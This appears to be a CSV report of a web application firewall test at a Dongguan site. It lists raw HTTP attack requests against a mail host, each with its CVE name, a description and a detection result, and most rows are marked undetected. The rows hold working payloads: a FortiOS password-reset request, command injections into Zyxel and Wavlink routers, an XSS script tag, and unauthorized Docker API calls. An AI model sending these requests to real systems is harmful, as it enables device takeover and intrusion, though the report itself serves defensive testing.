请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 POST /remote/logincheck?qhaeshs=7069633530526957569 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 141-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nAccept-Language: en-US，en;q=0.5-r-nCache-Control: no-store， no-cache， must-revalidate-r-nContent-Type: text/plain;charset=UTF-8-r-nIf-Modified-Since: Sat， 1 Jan 2000 00:00:00 GMT-r-nPragma: no-cache-r-nReferer: https://127.0.0.1/remote/login?lang=en-r-nqhaeshs: 7069633530526957569-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n{"ajax": "1"， "credential": "newpassword"， "credential2": "new"， "magic": "4tinet2095866"， "realm": ""， "reqid": "0"， "username": "username"},/remote/logincheck,7069633530526957569,VPN设备Fortigate默认配置不当漏洞（CVE-2018-13382）,Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。Fortinet FortiOS 6.0.0版本至6.0.4版本 、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。,未检测
 POST /v1.35/containers/7424bba170203b19b85b9718018de26be6598aa82a427e227bfe012232922f8d/wait?qhaeshs=7069633417465298945 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069633417465298945-r-nUser-Agent: docker-sdk-python/4.1.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/v1.35/containers/7424bba170203b19b85b9718018de26be6598aa82a427e227bfe012232922f8d/wait,7069633417465298945,基础设施Docker未授权访问漏洞,Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上。其被发现在Remote API开启并且为默认配置时，可被攻击者未授权访问，进而提权到宿主机。,检测
 PUT /v2/e7qyekv3yyac37sj1g3/blobs/uploads/17325dd7-407c-4101-8023-e1fa5708d62d?_state=2tkJ8coQ6dilPGAsuItSmyUwGHYgp4hMozbb2hPWYtp7Ik5hbWUiOiJlN3F5ZWt2M3l5YWMzN3NqMWczIiwiVVVJRCI6IjE3MzI1ZGQ3LTQwN2MtNDEwMS04MDIzLWUxZmE1NzA4ZDYyZCIsIk9mZnNldCI6MCwiU3RhcnRlZEF0IjoiMjAyMS0wNi0wNFQwMjoxMTo1OS42MjM0ODUxNjhaIn0%3D&digest=sha256%3A7aa04a224095ec10da37111596fe3e5baf71296b427758196a6288b0c7eb55c7&qhaeshs=7069633390143602689 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 195-r-nqhaeshs: 7069633390143602689-r-nUser-Agent: python-requests/2.13.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/v2/e7qyekv3yyac37sj1g3/blobs/uploads/17325dd7-407c-4101-8023-e1fa5708d62d?_state=2tkJ8coQ6dilPGAsuItSmyUwGHYgp4hMozbb2hPWYtp7Ik5hbWUiOiJlN3F5ZWt2M3l5YWMzN3NqMWczIiwiVVVJRCI6IjE3MzI1ZGQ3LTQwN2MtNDEwMS04MDIzLWUxZmE1NzA4ZDYyZCIsIk9mZnNldCI6MCwiU3RhcnRlZEF0IjoiMjAyMS0wNi0wNFQwMjoxMTo1OS42MjM0ODUxNjhaIn0%3D&digest=sha256%3A7aa04a224095ec10da37111596fe3e5baf71296b427758196a6288b0c7eb55c7,7069633390143602689,黑客工具Dockerscan模拟（文件上传）,Dockerscan是一款恶意镜像扫描的利器，其通过扫描镜像中的环境变量、操作命令以及端口开放信息来识别其是否为恶意镜像。该用例模拟dockerscan工具向docker registry上传任意文件。,未检测
 POST /v2/e7qyekv3yyac37sj1g3/blobs/uploads/?qhaeshs=7069633390143602689 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069633390143602689-r-nUser-Agent: python-requests/2.13.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/v2/e7qyekv3yyac37sj1g3/blobs/uploads/,7069633390143602689,黑客工具Dockerscan模拟（文件上传）,Dockerscan是一款恶意镜像扫描的利器，其通过扫描镜像中的环境变量、操作命令以及端口开放信息来识别其是否为恶意镜像。该用例模拟dockerscan工具向docker registry上传任意文件。,未检测
 GET /fwlink?qhaeshs=7069633373869703169 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633373869703169-r-nAccept: */*-r-nCookie: NRM/5PW+yLnB5twvLEGj47bCZCc4rIXpU16FlHR2AQ6q+TP9VuiVVUFGD8xyRf/uwb5oxmzPxIsxo4hF+k12RptsROp0GXYdzz8wrqJTgB3DeyA6/6C/wEgcX4E3Z0G6ZGss9Ar8GliiAI+loqn2pq4FrF02VDuZAjEa33LY/0Y=-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/fwlink,7069633373869703169,特定协议SMB永恒之蓝漏洞扫描,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 GET /activity?qhaeshs=7069633216616857601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633216616857601-r-nAccept: */*-r-nCookie: GD0IQJQh62nomziqeiqh5HZmVfp7B4040TgKRJVG+axIc7a8nA1M2lIX9WNXccDAM+xbuCnrKrTJJw3ny76Bkm2rZbNwotnxANuOgnOkSExBaTmSSizEzgF7HDug1DeAhZ+NB4RYzdEfcMZz8R+2zNN9JdsnJrip06x9KzSE4D4=-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Avant Browser)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/activity,7069633216616857601,特定协议SMB永恒之蓝漏洞利用,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 GET /9jdV?qhaeshs=7069633216616857601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633216616857601-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/9jdV,7069633216616857601,特定协议SMB永恒之蓝漏洞利用,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 GET /activity?qhaeshs=7069633216616857601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633216616857601-r-nAccept: */*-r-nCookie: JIv/JHGDTxMLidawfDKxDA4nq/tADdiuVaFZi6sBnQ1Kv/8a9cGtCyCWoN89eGIVyNRHT7hAUHITkmi3IublF86oN4uITDgso92r0klilfy8a67+WqM4SplhGM8vyTMEd9HPeL8wuH4/BBajYdTn0UWu9hHXsNDn/njPcHABi94=-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Avant Browser)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/activity,7069633216616857601,特定协议SMB永恒之蓝漏洞利用,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 GET /activity?qhaeshs=7069633216616857601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633216616857601-r-nAccept: */*-r-nCookie: FhU/bJKp85fj4ubkjqpYXSQwfmNRuEjg4dKl++4zGBKp9v3XANqvM6RkFX5UNOUFhuewCY3pV/wOE5BCgraX2Kn1Wu/V7g/R8JrZWIDN+W3q4uvuEOkqIjYSe7z0qDc7UtjdTDrqzNtaSArLiMeRisLXgzJOuP2V+FKoshedFps=-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Avant Browser)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/activity,7069633216616857601,特定协议SMB永恒之蓝漏洞利用,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 GET /fwlink?qhaeshs=7069633216616857601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633216616857601-r-nAccept: */*-r-nCookie: JdnhefMxgrDe+z8k6Y6hOUW8YBuw5QyE2axRidLEaLkNK9DYJvGDXy7JZgqsDq3Uo6IYj+4scv672l5EPHSv7d1+PQahOTVG2W6BtgWTld/3B127DdlZTBUFtI1cCAcHaK5v/pLPaPbpBnJufcpFeLzXk3rHddOnI4+LxYSzt50=-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSCOM)-r-nCache-Control: no-cache-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/fwlink,7069633216616857601,特定协议SMB永恒之蓝漏洞利用,SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。 永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。本用例模拟使用Cobalt Strike工具对永恒之蓝漏洞进行扫描。,未检测
 POST /login/login.html?qhaeshs=7069633066146201601 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 40-r-nqhaeshs: 7069633066146201601-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nmyname=a`id|id`&mypasswd=aa&Submit=Login,/login/login.html,7069633066146201601,网关设备Zyxel NWA-1100-NH命令执行漏洞（CVE-2021-4039）,NWA1100-NH 适用于一般小型办公室、学生宿网、零售据点、分点办公室、家庭与室内网路环境。合勤科技NWA-1100-NH固件的Web界面中存在一个命令注入漏洞，使得攻击者能够在设备上执行任意操作系统命令。,未检测
 GET /cgi-bin/1.txt?qhaeshs=7069633004896780289 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633004896780289-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/97.0.4692.71 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nUpgrade-Insecure-Requests: 1-r-nAccept-Language: zh-CN，zh;q=0.9-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/cgi-bin/1.txt,7069633004896780289,网关设备Wavlink远程命令执行漏洞（CVE-2022-2486）,WAVLINK WN535K2和WAVLINK WN535K3都是中国WAVLINK公司的一个无线路由器。WAVLINK WN535K2 和 WN535K3 版本存在安全漏洞，该漏洞源于/cgi-bin/mesh.cgi的未知部分，使用恶意Payload可能会导致 os 命令注入。,未检测
 GET /cgi-bin/mesh.cgi?page=upgrade&key=%27;ls%3E./1.txt;%27&qhaeshs=7069633004896780289 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069633004896780289-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/97.0.4692.71 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nUpgrade-Insecure-Requests: 1-r-nAccept-Language: zh-CN，zh;q=0.9-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/cgi-bin/mesh.cgi?page=upgrade&key=%27;ls%3E./1.txt;%27,7069633004896780289,网关设备Wavlink远程命令执行漏洞（CVE-2022-2486）,WAVLINK WN535K2和WAVLINK WN535K3都是中国WAVLINK公司的一个无线路由器。WAVLINK WN535K2 和 WN535K3 版本存在安全漏洞，该漏洞源于/cgi-bin/mesh.cgi的未知部分，使用恶意Payload可能会导致 os 命令注入。,未检测
 POST /cgi-bin/nightled.cgi?qhaeshs=7069632995728031745 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 30-r-nqhaeshs: 7069632995728031745-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-npage=night_led&start_hour=;id;,/cgi-bin/nightled.cgi,7069632995728031745,网关设备Wavlink远程命令执行漏洞（CVE-2022-2487）,WAVLINK WN535K2和WAVLINK WN535K3都是中国WAVLINK公司的一个无线路由器。WAVLINK WN535K2 和 WN535K3 版本存在安全漏洞，该漏洞源于/cgi-bin/nightled.cgi 的未知代码，对start_hour参数操作可能会导致 os 命令注入。,未检测
 POST /cgi-bin/login.cgi?qhaeshs=7069632986571866113 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 256-r-nqhaeshs: 7069632986571866113-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: -r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nnewUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")</script><script>alert(document.domain);</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn,/cgi-bin/login.cgi,7069632986571866113,网关设备Wavlink跨站脚本注入漏洞（CVE-2022-30489）,WAVLINK WN535 G3是中国WAVLINK公司的一个无线路由器。WAVLINK WN535 G3 存在安全漏洞，该漏洞源于/cgi-bin/login.cgi 中的主机名参数缺少过滤和转义，攻击者利用该漏洞可进行跨站脚本攻击。,未检测
 GET /backupsettings.dat?qhaeshs=7069632977407311873 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632977407311873-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3 rv:3.0; mni-IN) AppleWebKit/532.20.4 (KHTML， like Gecko) Version/4.1 Safari/532.20.4-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/backupsettings.dat,7069632977407311873,网关设备Wavlink越权访问漏洞（CVE-2022-34045）,WAVLINK WN530HG4是中国WAVLINK公司的一个无线路由器。WAVLINK WN530HG4 M30HG4.V5030.191116版本存在安全漏洞，该漏洞源于xportAllSettings.sh 的配置文件中包含硬编码的加密/解密密钥。,未检测
 GET /cgi-bin/ExportAllSettings.sh?qhaeshs=7069632968263729153 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069632968263729153-r-nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/5830-05-29 05:44:44 Firefox/3.8-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/cgi-bin/ExportAllSettings.sh,7069632968263729153,网关设备Wavlink越权访问漏洞（CVE-2022-34576）,WAVLINK WN535 G3是中国睿因科技（WAVLINK）公司的一个无线路由器。WAVLINK WN535 G3 M35G3R.V5030.180927版本存在安全漏洞。攻击者利用该漏洞通过特制的POST请求执行任意代码。,未检测
